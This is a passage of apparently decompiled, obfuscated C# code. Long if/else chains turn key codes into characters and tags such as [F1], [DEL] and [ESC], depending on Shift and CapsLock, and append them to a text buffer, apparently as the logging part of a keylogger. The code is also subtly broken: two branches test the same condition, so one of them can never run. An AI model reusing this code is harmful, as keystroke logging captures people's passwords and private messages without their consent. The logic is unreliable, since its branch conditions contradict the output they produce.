			}
			else if ((int)keys_0 == 13)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "\r\n");
			}
			else if ((int)keys_0 == 112)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F1]");
			}
			else if ((int)keys_0 == 113)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F2]");
			}
			else if ((int)keys_0 == 114)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F3]");
			}
			else if ((int)keys_0 == 115)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F4]");
			}
			else if ((int)keys_0 == 116)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F5]");
			}
			else if ((int)keys_0 == 117)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F6]");
			}
			else if ((int)keys_0 == 118)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F7]");
			}
			else if ((int)keys_0 == 119)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F8]");
			}
			else if ((int)keys_0 == 120)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F9]");
			}
			else if ((int)keys_0 == 121)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F10]");
			}
			else if ((int)keys_0 == 122)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F11]");
			}
			else if ((int)keys_0 == 123)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F12]");
			}
			else if ((int)keys_0 == 46)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[DEL]");
			}
			else if ((int)keys_0 == 8)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[DEL]");
			}
			else if ((int)keys_0 == 40)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 38)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 37)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 39)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 9)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[TAB]");
			}
			else if ((int)keys_0 == 35)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[END]");
			}
			else if ((int)keys_0 == 27)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[ESC]");
			}
			else if ((int)keys_0 == 111)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "/");
			}
			else if ((int)keys_0 == 110)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ".");
			}
			else if ((int)keys_0 == 109)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "-");
			}
			else if ((int)keys_0 == 107)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "+");
			}
			else if ((int)keys_0 == 106)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "*");
			}
		}
		else if (!((Computer)Class1.smethod_0()).get_Keyboard().get_ShiftKeyDown() & ((Computer)Class1.smethod_0()).get_Keyboard().get_CapsLock())
		{
			if ((int)keys_0 == 65)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "A");
			}
			else if ((int)keys_0 == 66)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "B");
			}
			else if ((int)keys_0 == 67)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "C");
			}
			else if ((int)keys_0 == 68)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "D");
			}
			else if ((int)keys_0 == 69)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "E");
			}
			else if ((int)keys_0 == 70)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "F");
			}
			else if ((int)keys_0 == 71)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "G");
			}
			else if ((int)keys_0 == 72)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "H");
			}
			else if ((int)keys_0 == 73)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "I");
			}
			else if ((int)keys_0 == 74)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "J");
			}
			else if ((int)keys_0 == 75)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "K");
			}
			else if ((int)keys_0 == 76)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "L");
			}
			else if ((int)keys_0 == 77)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "M");
			}
			else if ((int)keys_0 == 78)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "N");
			}
			else if ((int)keys_0 == 79)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "O");
			}
			else if ((int)keys_0 == 80)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "P");
			}
			else if ((int)keys_0 == 81)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "Q");
			}
			else if ((int)keys_0 == 82)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "R");
			}
			else if ((int)keys_0 == 83)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "S");
			}
			else if ((int)keys_0 == 84)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "T");
			}
			else if ((int)keys_0 == 85)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "U");
			}
			else if ((int)keys_0 == 86)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "V");
			}
			else if ((int)keys_0 == 87)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "W");
			}
			else if ((int)keys_0 == 88)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "X");
			}
			else if ((int)keys_0 == 89)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "Y");
			}
			else if ((int)keys_0 == 90)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "Z");
			}
			else if ((int)keys_0 == 48)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "0");
			}
			else if ((int)keys_0 == 49)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "1");
			}
			else if ((int)keys_0 == 50)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "2");
			}
			else if ((int)keys_0 == 51)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "3");
			}
			else if ((int)keys_0 == 52)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "4");
			}
			else if ((int)keys_0 == 53)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "5");
			}
			else if ((int)keys_0 == 54)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "6");
			}
			else if ((int)keys_0 == 55)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "7");
			}
			else if ((int)keys_0 == 56)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "8");
			}
			else if ((int)keys_0 == 57)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "9");
			}
			else if ((int)keys_0 == 96)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "0");
			}
			else if ((int)keys_0 == 97)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "1");
			}
			else if ((int)keys_0 == 98)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "2");
			}
			else if ((int)keys_0 == 99)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "3");
			}
			else if ((int)keys_0 == 100)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "4");
			}
			else if ((int)keys_0 == 101)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "5");
			}
			else if ((int)keys_0 == 102)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "6");
			}
			else if ((int)keys_0 == 103)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "7");
			}
			else if ((int)keys_0 == 104)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "8");
			}
			else if ((int)keys_0 == 105)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "9");
			}
			else if ((int)keys_0 == 188)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ",");
			}
			else if ((int)keys_0 == 189)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "-");
			}
			else if ((int)keys_0 == 222)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "'");
			}
			else if ((int)keys_0 == 219)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[");
			}
			else if ((int)keys_0 == 221)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "]");
			}
			else if ((int)keys_0 == 191)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "/");
			}
			else if ((int)keys_0 == 220)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "\\");
			}
			else if ((int)keys_0 == 186)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ";");
			}
			else if ((int)keys_0 == 190)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ".");
			}
			else if ((int)keys_0 == 192)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "`");
			}
			else if ((int)keys_0 == 32)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + " ");
			}
			else if ((int)keys_0 == 13)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "\r\n");
			}
			else if ((int)keys_0 == 112)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F1]");
			}
			else if ((int)keys_0 == 113)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F2]");
			}
			else if ((int)keys_0 == 114)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F3]");
			}
			else if ((int)keys_0 == 115)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F4]");
			}
			else if ((int)keys_0 == 116)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F5]");
			}
			else if ((int)keys_0 == 117)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F6]");
			}
			else if ((int)keys_0 == 118)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F7]");
			}
			else if ((int)keys_0 == 119)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F8]");
			}
			else if ((int)keys_0 == 120)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F9]");
			}
			else if ((int)keys_0 == 121)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F10]");
			}
			else if ((int)keys_0 == 122)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F11]");
			}
			else if ((int)keys_0 == 123)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F12]");
			}
			else if ((int)keys_0 == 46)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[DEL]");
			}
			else if ((int)keys_0 == 8)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[DEL]");
			}
			else if ((int)keys_0 == 40)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 38)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 37)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 39)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 9)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[TAB]");
			}
			else if ((int)keys_0 == 35)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[END]");
			}
			else if ((int)keys_0 == 27)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[ESC]");
			}
			else if ((int)keys_0 == 111)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "/");
			}
			else if ((int)keys_0 == 110)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ".");
			}
			else if ((int)keys_0 == 109)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "-");
			}
			else if ((int)keys_0 == 107)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "+");
			}
			else if ((int)keys_0 == 106)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "*");
			}
		}
		else if (((Computer)Class1.smethod_0()).get_Keyboard().get_ShiftKeyDown() & ((Computer)Class1.smethod_0()).get_Keyboard().get_CapsLock())
		{
			if ((int)keys_0 == 49)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "!");
			}
			else if ((int)keys_0 == 50)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "@");
			}
			else if ((int)keys_0 == 51)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "#");
			}
			else if ((int)keys_0 == 52)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "$");
			}
			else if ((int)keys_0 == 53)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "%");
			}
			else if ((int)keys_0 == 54)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "^");
			}
			else if ((int)keys_0 == 55)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "&");
			}
			else if ((int)keys_0 == 56)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "*");
			}
			else if ((int)keys_0 == 57)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "(");
			}
			else if ((int)keys_0 == 48)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ")");
			}
			else if ((int)keys_0 == 65)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "A");
			}
			else if ((int)keys_0 == 66)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "B");
			}
			else if ((int)keys_0 == 67)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "C");
			}
			else if ((int)keys_0 == 68)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "D");
			}
			else if ((int)keys_0 == 69)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "E");
			}
			else if ((int)keys_0 == 70)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "F");
			}
			else if ((int)keys_0 == 71)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "G");
			}
			else if ((int)keys_0 == 72)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "H");
			}
			else if ((int)keys_0 == 73)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "I");
			}
			else if ((int)keys_0 == 74)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "J");
			}
			else if ((int)keys_0 == 75)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "K");
			}
			else if ((int)keys_0 == 76)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "L");
			}
			else if ((int)keys_0 == 77)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "M");
			}
			else if ((int)keys_0 == 78)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "N");
			}
			else if ((int)keys_0 == 79)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "O");
			}
			else if ((int)keys_0 == 80)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "P");
			}
			else if ((int)keys_0 == 81)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "Q");
			}
			else if ((int)keys_0 == 82)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "R");
			}
			else if ((int)keys_0 == 83)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "S");
			}
			else if ((int)keys_0 == 84)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "T");
			}
			else if ((int)keys_0 == 85)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "U");
			}
			else if ((int)keys_0 == 86)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "V");
			}
			else if ((int)keys_0 == 87)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "W");
			}
			else if ((int)keys_0 == 88)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "X");
			}
			else if ((int)keys_0 == 89)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "Y");
			}
			else if ((int)keys_0 == 90)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "Z");
			}
			else if ((int)keys_0 == 188)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "<");
			}
			else if ((int)keys_0 == 189)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "_");
			}
			else if ((int)keys_0 == 219)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "{");
			}
			else if ((int)keys_0 == 221)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "}");
			}
			else if ((int)keys_0 == 191)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 220)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "|");
			}
			else if ((int)keys_0 == 186)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ":");
			}
			else if ((int)keys_0 == 190)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ">");
			}
			else if ((int)keys_0 == 192)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "~");
			}
			else if ((int)keys_0 == 32)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + " ");
			}
			else if ((int)keys_0 == 13)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "\r\n");
			}
			else if ((int)keys_0 == 112)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F1]");
			}
			else if ((int)keys_0 == 113)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F2]");
			}
			else if ((int)keys_0 == 114)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F3]");
			}
			else if ((int)keys_0 == 115)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F4]");
			}
			else if ((int)keys_0 == 116)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F5]");
			}
			else if ((int)keys_0 == 117)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F6]");
			}
			else if ((int)keys_0 == 118)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F7]");
			}
			else if ((int)keys_0 == 119)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F8]");
			}
			else if ((int)keys_0 == 120)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F9]");
			}
			else if ((int)keys_0 == 121)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F10]");
			}
			else if ((int)keys_0 == 122)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F11]");
			}
			else if ((int)keys_0 == 123)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F12]");
			}
			else if ((int)keys_0 == 46)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[DEL]");
			}
			else if ((int)keys_0 == 8)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[DEL]");
			}
			else if ((int)keys_0 == 40)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 38)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 37)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 39)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 9)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[TAB]");
			}
			else if ((int)keys_0 == 35)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[END]");
			}
			else if ((int)keys_0 == 27)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[ESC]");
			}
			else if ((int)keys_0 == 111)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "/");
			}
			else if ((int)keys_0 == 110)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ".");
			}
			else if ((int)keys_0 == 109)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "-");
			}
			else if ((int)keys_0 == 107)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "+");
			}
			else if ((int)keys_0 == 106)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "*");
			}
		}
		else if (!((Computer)Class1.smethod_0()).get_Keyboard().get_ShiftKeyDown() & ((Computer)Class1.smethod_0()).get_Keyboard().get_CapsLock())
		{
			if ((int)keys_0 == 49)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "1");
			}
			else if ((int)keys_0 == 50)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "2");
			}
			else if ((int)keys_0 == 51)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "3");
			}
			else if ((int)keys_0 == 52)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "4");
			}
			else if ((int)keys_0 == 53)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "5");
			}
			else if ((int)keys_0 == 54)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "6");
			}
			else if ((int)keys_0 == 55)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "7");
			}
			else if ((int)keys_0 == 56)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "8");
			}
			else if ((int)keys_0 == 57)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "9");
			}
			else if ((int)keys_0 == 48)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "0");
			}
			else if ((int)keys_0 == 65)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "a");
			}
			else if ((int)keys_0 == 66)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "b");
			}
			else if ((int)keys_0 == 67)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "c");
			}
			else if ((int)keys_0 == 68)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "d");
			}
			else if ((int)keys_0 == 69)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "e");
			}
			else if ((int)keys_0 == 70)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "f");
			}
			else if ((int)keys_0 == 71)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "g");
			}
			else if ((int)keys_0 == 72)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "h");
			}
			else if ((int)keys_0 == 73)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "i");
			}
			else if ((int)keys_0 == 74)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "j");
			}
			else if ((int)keys_0 == 75)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "k");
			}
			else if ((int)keys_0 == 76)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "l");
			}
			else if ((int)keys_0 == 77)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "m");
			}
			else if ((int)keys_0 == 78)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "n");
			}
			else if ((int)keys_0 == 79)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "o");
			}
			else if ((int)keys_0 == 80)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "p");
			}
			else if ((int)keys_0 == 81)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "q");
			}
			else if ((int)keys_0 == 82)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "r");
			}
			else if ((int)keys_0 == 83)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "s");
			}
			else if ((int)keys_0 == 84)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "t");
			}
			else if ((int)keys_0 == 85)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "u");
			}
			else if ((int)keys_0 == 86)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "v");
			}
			else if ((int)keys_0 == 87)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "w");
			}
			else if ((int)keys_0 == 88)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "x");
			}
			else if ((int)keys_0 == 89)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "y");
			}
			else if ((int)keys_0 == 90)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "z");
			}
			else if ((int)keys_0 == 188)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ",");
			}
			else if ((int)keys_0 == 189)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "-");
			}
			else if ((int)keys_0 == 222)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "'");
			}
			else if ((int)keys_0 == 219)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[");
			}
			else if ((int)keys_0 == 221)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "]");
			}
			else if ((int)keys_0 == 191)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "/");
			}
			else if ((int)keys_0 == 220)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "\\");
			}
			else if ((int)keys_0 == 186)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ";");
			}
			else if ((int)keys_0 == 190)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ".");
			}
			else if ((int)keys_0 == 192)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "`");
			}
			else if ((int)keys_0 == 32)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + " ");
			}
			else if ((int)keys_0 == 13)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "\r\n");
			}
			else if ((int)keys_0 == 112)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F1]");
			}
			else if ((int)keys_0 == 113)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F2]");
			}
			else if ((int)keys_0 == 114)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F3]");
			}
			else if ((int)keys_0 == 115)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F4]");
			}
			else if ((int)keys_0 == 116)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F5]");
			}
			else if ((int)keys_0 == 117)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F6]");
			}
			else if ((int)keys_0 == 118)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F7]");
			}
			else if ((int)keys_0 == 119)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F8]");
			}
			else if ((int)keys_0 == 120)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F9]");
			}
			else if ((int)keys_0 == 121)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F10]");
			}
			else if ((int)keys_0 == 122)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F11]");
			}
			else if ((int)keys_0 == 123)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[F12]");
			}
			else if ((int)keys_0 == 46)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[DEL]");
			}
			else if ((int)keys_0 == 8)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[DEL]");
			}
			else if ((int)keys_0 == 40)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 38)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 37)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 39)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "?");
			}
			else if ((int)keys_0 == 9)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[TAB]");
			}
			else if ((int)keys_0 == 35)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[END]");
			}
			else if ((int)keys_0 == 27)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "[ESC]");
			}
			else if ((int)keys_0 == 111)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "/");
			}
			else if ((int)keys_0 == 110)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ".");
			}
			else if ((int)keys_0 == 109)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "-");
			}
			else if ((int)keys_0 == 107)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "+");
			}
			else if ((int)keys_0 == 106)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "*");
			}
		}
		else if (((Computer)Class1.smethod_0()).get_Keyboard().get_ShiftKeyDown() & !((Computer)Class1.smethod_0()).get_Keyboard().get_CapsLock())
		{
			if ((int)keys_0 == 49)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "!");
			}
			else if ((int)keys_0 == 50)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "@");
			}
			else if ((int)keys_0 == 51)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "#");
			}
			else if ((int)keys_0 == 52)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "$");
			}
			else if ((int)keys_0 == 53)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "%");
			}
			else if ((int)keys_0 == 54)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "^");
			}
			else if ((int)keys_0 == 55)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "&");
			}
			else if ((int)keys_0 == 56)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "*");
			}
			else if ((int)keys_0 == 57)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "(");
			}
			else if ((int)keys_0 == 48)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + ")");
			}
			else if ((int)keys_0 == 65)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "A");
			}
			else if ((int)keys_0 == 66)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "B");
			}
			else if ((int)keys_0 == 67)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "C");
			}
			else if ((int)keys_0 == 68)
			{
				vmethod_6().set_Text(vmethod_6().get_Text() + "D");
			}
			else if ((int)keys_0 == 69)
			{
